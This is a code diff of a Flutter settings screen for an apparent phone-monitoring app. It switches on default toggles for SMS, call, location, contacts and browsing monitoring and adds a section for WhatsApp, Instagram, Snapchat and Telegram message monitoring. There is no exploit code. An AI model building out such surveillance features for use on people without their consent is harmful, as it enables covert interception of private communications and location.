@@ -18,17 +18,20 @@ class SettingsController extends ChangeNotifier {
   final String deviceModel;
   final DatabaseReference _database = FirebaseDatabase.instance.ref();
   Map<String, bool> _settings = {
-    'sms': false,
+    'sms': true,
     'mms': false,
-    'call': false,
-    'callRecording': false,
-    'location': false,
-    'apps': false,
-    'sites': false,
-    'contacts': false,
+    'call': true,
+    'location': true,
+    'apps': true,
+    'sites': true,
+    'contacts': true,
     'screenshot': false,
-    'instantMessaging': false,
     'photos': false,
+    'whatsapp': true,
+    'instagram': true,
+    'snapchat': false,
+    'telegram': false,
+    'appUsageTracking': true,
   };
 
   SettingsController({required this.userId, required this.deviceModel}) {
@@ -127,11 +130,13 @@ class _SettingsScreenState extends State<SettingsScreen>
   bool _communicationExpanded = true;
   bool _locationExpanded = true;
   bool _otherExpanded = true;
+  bool _messagingExpanded = true;
 
   // Initialize controllers
   late AnimationController _communicationController;
   late AnimationController _locationController;
   late AnimationController _otherController;
+  late AnimationController _messagingController;
 
   @override
   void initState() {
@@ -168,6 +173,12 @@ class _SettingsScreenState extends State<SettingsScreen>
       duration: const Duration(milliseconds: 300),
       value: 1.0,
     );
+
+    _messagingController = AnimationController(
+      vsync: this,
+      duration: const Duration(milliseconds: 300),
+      value: 1.0,
+    );
   }
 
   @override
@@ -177,6 +188,7 @@ class _SettingsScreenState extends State<SettingsScreen>
     _communicationController.dispose();
     _locationController.dispose();
     _otherController.dispose();
+    _messagingController.dispose();
     _scrollController.dispose();
 
     // Clear any cached data
@@ -586,323 +598,364 @@ class _SettingsScreenState extends State<SettingsScreen>
 
   @override
   Widget build(BuildContext context) {
-    if (_isLoading) {
-      return Scaffold(
+    return WillPopScope(
+      onWillPop: () async {
+        Navigator.pushReplacement(
+          context,
+          MaterialPageRoute(builder: (context) => DashboardScreen()),
+        );
+        return false;
+      },
+      child: Scaffold(
+        backgroundColor: Colors.transparent,
+        extendBodyBehindAppBar: true,
+        appBar: PreferredSize(
+          preferredSize: const Size.fromHeight(kToolbarHeight),
+          child: Container(
+            decoration: BoxDecoration(
+              gradient: LinearGradient(
+                begin: Alignment.topLeft,
+                end: Alignment.bottomRight,
+                colors: [
+                  AppTheme.primaryColor,
+                  AppTheme.primaryColor.withOpacity(0.9),
+                ],
+              ),
+              borderRadius: const BorderRadius.vertical(
+                bottom: Radius.circular(30),
+              ),
+            ),
+            child: AppBar(
+              leading: IconButton(
+                icon: const Icon(
+                  Icons.arrow_back_ios_new_rounded,
+                  color: AppTheme.surfaceColor,
+                  size: 22,
+                ),
+                onPressed: () => Navigator.pushReplacement(
+                  context,
+                  MaterialPageRoute(builder: (context) => DashboardScreen()),
+                ),
+              ),
+              title: const Text('Settings', style: AppTheme.headlineStyle),
+              actions: [
+                IconButton(
+                  icon: const Icon(
+                    Icons.logout_rounded,
+                    color: AppTheme.surfaceColor,
+                    size: 24,
+                  ),
+                  onPressed: () async {
+                    // Show confirmation dialog
+                    final shouldLogout = await showDialog<bool>(
+                      context: context,
+                      builder: (context) => AlertDialog(
+                        title: const Text('Logout'),
+                        content: const Text('Are you sure you want to logout?'),
+                        actions: [
+                          TextButton(
+                            onPressed: () => Navigator.pop(context, false),
+                            child: const Text('Cancel'),
+                          ),
+                          TextButton(
+                            onPressed: () => Navigator.pop(context, true),
+                            child: const Text(
+                              'Logout',
+                              style: TextStyle(color: Colors.red),
+                            ),
+                          ),
+                        ],
+                      ),
+                    );
+
+                    if (shouldLogout == true) {
+                      await FirebaseAuth.instance.signOut();
+                      if (mounted) {
+                        // Clear navigation stack and go to auth screen
+                        Navigator.of(context).pushNamedAndRemoveUntil(
+                          '/',
+                          (Route<dynamic> route) => false,
+                        );
+                      }
+                    }
+                  },
+                ),
+                const SizedBox(width: 8),
+              ],
+              backgroundColor: Colors.transparent,
+              elevation: 0,
+            ),
+          ),
+        ),
         body: Container(
           decoration: const BoxDecoration(
-            gradient: AppTheme.backgroundGradient,
-          ),
-          child: const Center(
-            child: CircularProgressIndicator(
-              color: AppTheme.primaryColor,
-            ),
-          ),
-        ),
-      );
-    }
-
-    return Scaffold(
-      backgroundColor: Colors.transparent,
-      extendBodyBehindAppBar: true,
-      appBar: PreferredSize(
-        preferredSize: const Size.fromHeight(kToolbarHeight),
-        child: Container(
-          decoration: BoxDecoration(
             gradient: LinearGradient(
-              begin: Alignment.topLeft,
-              end: Alignment.bottomRight,
+              begin: Alignment.topCenter,
+              end: Alignment.bottomCenter,
               colors: [
                 AppTheme.primaryColor,
-                AppTheme.primaryColor.withOpacity(0.9),
+                AppTheme.backgroundColor,
+                AppTheme.backgroundColor,
               ],
-            ),
-            borderRadius: const BorderRadius.vertical(
-              bottom: Radius.circular(30),
+              stops: [0.0, 0.2, 1.0],
             ),
           ),
-          child: AppBar(
-            leading: IconButton(
-              icon: const Icon(
-                Icons.arrow_back_ios_new_rounded,
-                color: AppTheme.surfaceColor,
-                size: 22,
-              ),
-              onPressed: () => Navigator.of(context).pop(),
+          child: SingleChildScrollView(
+            controller: _scrollController,
+            physics: const BouncingScrollPhysics(),
+            padding: EdgeInsets.only(
+              top: MediaQuery.of(context).padding.top + kToolbarHeight + 16,
+              bottom: 16,
             ),
-            title: const Text('Settings', style: AppTheme.headlineStyle),
-            actions: [
-              IconButton(
-                icon: const Icon(
-                  Icons.logout_rounded,
-                  color: AppTheme.surfaceColor,
-                  size: 24,
+            child: Column(
+              children: [
+                _buildDeviceInfoCard(),
+                _buildSectionHeader(
+                  'Communication',
+                  'Manage message and call monitoring',
+                  Icons.chat_bubble_outline,
+                  _communicationExpanded,
+                  () {
+                    setState(() {
+                      _communicationExpanded = !_communicationExpanded;
+                      if (_communicationExpanded) {
+                        _communicationController.forward();
+                      } else {
+                        _communicationController.reverse();
+                      }
+                    });
+                  },
+                  _communicationController,
                 ),
-                onPressed: () async {
-                  // Show confirmation dialog
-                  final shouldLogout = await showDialog<bool>(
-                    context: context,
-                    builder: (context) => AlertDialog(
-                      title: Text('Logout'),
-                      content: Text('Are you sure you want to logout?'),
-                      actions: [
-                        TextButton(
-                          onPressed: () => Navigator.pop(context, false),
-                          child: Text('Cancel'),
-                        ),
-                        TextButton(
-                          onPressed: () => Navigator.pop(context, true),
-                          child: Text(
-                            'Logout',
-                            style: TextStyle(color: Colors.red),
-                          ),
-                        ),
-                      ],
-                    ),
-                  );
+                if (_communicationExpanded) ...[
+                  _buildSettingTile(
+                    'SMS Monitoring',
+                    'Monitor SMS messages and conversations',
+                    'sms',
+                    Icons.message_outlined,
+                  ),
+                  _buildSettingTile(
+                    'MMS Monitoring',
+                    'Track multimedia messages and attachments',
+                    'mms',
+                    Icons.mms_outlined,
+                  ),
+                  _buildSettingTile(
+                    'Call Monitoring',
+                    'Record and monitor phone calls',
+                    'call',
+                    Icons.call_outlined,
+                  ),
+                  _buildSettingTile(
+                    'Contacts',
+                    'Monitor contact list changes and interactions',
+                    'contacts',
+                    Icons.contacts_outlined,
+                  ),
+                ],
+                _buildSectionHeader(
+                  'Location & Activity',
+                  'Track location and app usage',
+                  Icons.location_on_outlined,
+                  _locationExpanded,
+                  () {
+                    setState(() {
+                      _locationExpanded = !_locationExpanded;
+                      if (_locationExpanded) {
+                        _locationController.forward();
+                      } else {
+                        _locationController.reverse();
+                      }
+                    });
+                  },
+                  _locationController,
+                ),
+                if (_locationExpanded) ...[
+                  _buildSettingTile(
+                    'Location Tracking',
+                    'Monitor real-time location and movement',
+                    'location',
+                    Icons.location_on_outlined,
+                  ),
+                  _buildSettingTile(
+                    'App Monitoring',
+                    'Track installed applications',
+                    'apps',
+                    Icons.apps_outlined,
+                  ),
+                  _buildSettingTile(
+                    'App Usage Tracking',
+                    'Monitor application usage time and patterns',
+                    'appUsageTracking',
+                    Icons.timer_outlined,
+                  ),
+                  _buildSettingTile(
+                    'Web Monitoring',
+                    'Monitor browser history and activity',
+                    'sites',
+                    Icons.web_outlined,
+                  ),
+                ],
+                _buildSectionHeader(
+                  'Other Monitoring',
+                  'Additional monitoring features',
+                  Icons.more_horiz_outlined,
+                  _otherExpanded,
+                  () {
+                    setState(() {
+                      _otherExpanded = !_otherExpanded;
+                      if (_otherExpanded) {
+                        _otherController.forward();
+                      } else {
+                        _otherController.reverse();
+                      }
+                    });
+                  },
+                  _otherController,
+                ),
+                if (_otherExpanded) ...[
+                  _buildSettingTile(
+                    'Screenshot',
+                    'Capture periodic screenshots of device activity',
+                    'screenshot',
+                    Icons.screenshot_outlined,
+                  ),
+                  _buildSettingTile(
+                    'Photos Monitor',
+                    'Track camera usage and photo gallery',
+                    'photos',
+                    Icons.photo_outlined,
+                  ),
+                ],
+                _buildSectionHeader(
+                  'Instant Messaging',
+                  'Monitor Social Media messaging applications',
+                  Icons.chat_outlined,
+                  _messagingExpanded,
+                  () {
+                    setState(() {
+                      _messagingExpanded = !_messagingExpanded;
+                      if (_messagingExpanded) {
+                        _messagingController.forward();
+                      } else {
+                        _messagingController.reverse();
+                      }
+                    });
+                  },
+                  _messagingController,
+                ),
+                if (_messagingExpanded) ...[
+                  _buildSettingTile(
+                    'WhatsApp',
+                    'Monitor WhatsApp messages and calls',
+                    'whatsapp',
+                    Icons.messenger_outlined,
+                  ),
+                  _buildSettingTile(
+                    'Instagram',
+                    'Monitor Instagram DMs and activity',
+                    'instagram',
+                    Icons.camera_alt_outlined,
+                  ),
+                  _buildSettingTile(
+                    'Snapchat',
+                    'Monitor Snapchat messages and stories',
+                    'snapchat',
+                    Icons.remove_red_eye_outlined,
+                  ),
+                  _buildSettingTile(
+                    'Telegram',
+                    'Monitor Telegram messages and calls',
+                    'telegram',
+                    Icons.send_outlined,
+                  ),
+                ],
+                const SizedBox(height: 80),
+              ],
+            ),
+          ),
+        ),
+        bottomNavigationBar: CurvedNavigationBar(
+          key: _bottomNavigationKey,
+          index: 4,
+          items: const [
+            CurvedNavigationBarItem(
+              child: Icon(Icons.home_outlined),
+              label: 'Home',
+            ),
+            CurvedNavigationBarItem(
+              child: Icon(Icons.history),
+              label: 'Recent',
+            ),
+            CurvedNavigationBarItem(
+              child: Icon(Icons.phone_android_outlined),
+              label: 'Remote',
+            ),
+            CurvedNavigationBarItem(
+              child: Icon(Icons.bar_chart),
+              label: 'Stats',
+            ),
+            CurvedNavigationBarItem(
+              child: Icon(Icons.settings),
+              label: 'Settings',
+            ),
+          ],
+          color: Colors.white,
+          buttonBackgroundColor: Colors.white,
+          backgroundColor: AppTheme.primaryColor,
+          animationCurve: Curves.easeInOutCubic,
+          animationDuration: const Duration(milliseconds: 800),
+          onTap: (index) {
+            // Prevent navigation if already on the selected page
+            if (index == _page) return;
 
-                  if (shouldLogout == true) {
-                    await FirebaseAuth.instance.signOut();
-                    if (mounted) {
-                      // Clear navigation stack and go to auth screen
-                      Navigator.of(context).pushNamedAndRemoveUntil(
-                        '/',
-                        (Route<dynamic> route) => false,
-                      );
-                    }
+            setState(() {
+              _page = index;
+            });
+
+            // Use Navigator.pushReplacement instead of push to prevent stack buildup
+            Navigator.pushReplacement(
+              context,
+              PageRouteBuilder(
+                pageBuilder: (context, animation, secondaryAnimation) {
+                  switch (index) {
+                    case 0:
+                      return DashboardScreen();
+                    case 1:
+                      return RecentsScreen(
+                          selectedDevice: widget.selectedDevice);
+                    case 2:
+                      return RemoteControlScreen(
+                          selectedDevice: widget.selectedDevice);
+                    case 3:
+                      return AdvancedStatsScreen(
+                          selectedDevice: widget.selectedDevice);
+                    case 4:
+                      return SettingsScreen(
+                          selectedDevice: widget.selectedDevice);
+                    default:
+                      return DashboardScreen();
                   }
                 },
-              ),
-              SizedBox(width: 8),
-            ],
-            backgroundColor: Colors.transparent,
-            elevation: 0,
-          ),
-        ),
-      ),
-      body: Container(
-        decoration: BoxDecoration(
-          gradient: LinearGradient(
-            begin: Alignment.topCenter,
-            end: Alignment.bottomCenter,
-            colors: [
-              AppTheme.primaryColor,
-              AppTheme.backgroundColor,
-              AppTheme.backgroundColor,
-            ],
-            stops: const [0.0, 0.2, 1.0],
-          ),
-        ),
-        child: SingleChildScrollView(
-          controller: _scrollController,
-          physics: const BouncingScrollPhysics(),
-          padding: EdgeInsets.only(
-            top: MediaQuery.of(context).padding.top + kToolbarHeight + 16,
-            bottom: 16,
-          ),
-          child: Column(
-            children: [
-              _buildDeviceInfoCard(),
-              _buildSectionHeader(
-                'Communication',
-                'Manage message and call monitoring',
-                Icons.chat_bubble_outline,
-                _communicationExpanded,
-                () {
-                  setState(() {
-                    _communicationExpanded = !_communicationExpanded;
-                    if (_communicationExpanded) {
-                      _communicationController.forward();
-                    } else {
-                      _communicationController.reverse();
-                    }
-                  });
+                transitionsBuilder:
+                    (context, animation, secondaryAnimation, child) {
+                  const begin = Offset(1.0, 0.0);
+                  const end = Offset.zero;
+                  const curve = Curves.easeInOutCubic;
+
+                  var tween = Tween(begin: begin, end: end)
+                      .chain(CurveTween(curve: curve));
+
+                  return SlideTransition(
+                    position: animation.drive(tween),
+                    child: child,
+                  );
                 },
-                _communicationController,
               ),
-              if (_communicationExpanded) ...[
-                _buildSettingTile(
-                  'SMS Monitoring',
-                  'Monitor SMS messages and conversations',
-                  'sms',
-                  Icons.message_outlined,
-                ),
-                _buildSettingTile(
-                  'MMS Monitoring',
-                  'Track multimedia messages and attachments',
-                  'mms',
-                  Icons.mms_outlined,
-                ),
-                _buildSettingTile(
-                  'Call Monitoring',
-                  'Record and monitor phone calls',
-                  'call',
-                  Icons.call_outlined,
-                ),
-                _buildSettingTile(
-                  'Contacts',
-                  'Monitor contact list changes and interactions',
-                  'contacts',
-                  Icons.contacts_outlined,
-                ),
-              ],
-              _buildSectionHeader(
-                'Location & Activity',
-                'Track location and app usage',
-                Icons.location_on_outlined,
-                _locationExpanded,
-                () {
-                  setState(() {
-                    _locationExpanded = !_locationExpanded;
-                    if (_locationExpanded) {
-                      _locationController.forward();
-                    } else {
-                      _locationController.reverse();
-                    }
-                  });
-                },
-                _locationController,
-              ),
-              if (_locationExpanded) ...[
-                _buildSettingTile(
-                  'Location Tracking',
-                  'Monitor real-time location and movement',
-                  'location',
-                  Icons.location_on_outlined,
-                ),
-                _buildSettingTile(
-                  'App Monitoring',
-                  'Track app usage and activity patterns',
-                  'apps',
-                  Icons.apps_outlined,
-                ),
-                _buildSettingTile(
-                  'Web Monitoring',
-                  'Monitor browser history and activity',
-                  'sites',
-                  Icons.web_outlined,
-                ),
-              ],
-              _buildSectionHeader(
-                'Other Monitoring',
-                'Additional monitoring features',
-                Icons.more_horiz_outlined,
-                _otherExpanded,
-                () {
-                  setState(() {
-                    _otherExpanded = !_otherExpanded;
-                    if (_otherExpanded) {
-                      _otherController.forward();
-                    } else {
-                      _otherController.reverse();
-                    }
-                  });
-                },
-                _otherController,
-              ),
-              if (_otherExpanded) ...[
-                _buildSettingTile(
-                  'Screenshot',
-                  'Capture periodic screenshots of device activity',
-                  'screenshot',
-                  Icons.screenshot_outlined,
-                ),
-                _buildSettingTile(
-                  'Photos Monitor',
-                  'Track camera usage and photo gallery',
-                  'photos',
-                  Icons.photo_outlined,
-                ),
-                _buildSettingTile(
-                  'Instant Messaging',
-                  'Monitor popular messaging applications',
-                  'instantMessaging',
-                  Icons.message_outlined,
-                ),
-              ],
-              const SizedBox(height: 80),
-            ],
-          ),
+            );
+          },
+          letIndexChange: (index) => true,
         ),
-      ),
-      bottomNavigationBar: CurvedNavigationBar(
-        key: _bottomNavigationKey,
-        index: 4,
-        items: const [
-          CurvedNavigationBarItem(
-            child: Icon(Icons.home_outlined),
-            label: 'Home',
-          ),
-          CurvedNavigationBarItem(
-            child: Icon(Icons.history),
-            label: 'Recent',
-          ),
-          CurvedNavigationBarItem(
-            child: Icon(Icons.phone_android_outlined),
-            label: 'Remote',
-          ),
-          CurvedNavigationBarItem(
-            child: Icon(Icons.bar_chart),
-            label: 'Stats',
-          ),
-          CurvedNavigationBarItem(
-            child: Icon(Icons.settings),
-            label: 'Settings',
-          ),
-        ],
-        color: Colors.white,
-        buttonBackgroundColor: Colors.white,
-        backgroundColor: AppTheme.primaryColor,
-        animationCurve: Curves.easeInOutCubic,
-        animationDuration: const Duration(milliseconds: 800),
-        onTap: (index) {
-          // Prevent navigation if already on the selected page
-          if (index == _page) return;
-
-          setState(() {
-            _page = index;
-          });
-
-          // Use Navigator.pushReplacement instead of push to prevent stack buildup
-          Navigator.pushReplacement(
-            context,
-            PageRouteBuilder(
-              pageBuilder: (context, animation, secondaryAnimation) {
-                switch (index) {
-                  case 0:
-                    return DashboardScreen();
-                  case 1:
-                    return RecentsScreen(selectedDevice: widget.selectedDevice);
-                  case 2:
-                    return RemoteControlScreen(
-                        selectedDevice: widget.selectedDevice);
-                  case 3:
-                    return AdvancedStatsScreen(
-                        selectedDevice: widget.selectedDevice);
-                  case 4:
-                    return SettingsScreen(
-                        selectedDevice: widget.selectedDevice);
-                  default:
-                    return DashboardScreen();
-                }
-              },
-              transitionsBuilder:
-                  (context, animation, secondaryAnimation, child) {
-                const begin = Offset(1.0, 0.0);
-                const end = Offset.zero;
-                const curve = Curves.easeInOutCubic;
-
-                var tween = Tween(begin: begin, end: end)
-                    .chain(CurveTween(curve: curve));
-
-                return SlideTransition(
-                  position: animation.drive(tween),
-                  child: child,
-                );
-              },
-            ),
-          );
-        },
-        letIndexChange: (index) => true,
       ),
     );
   }
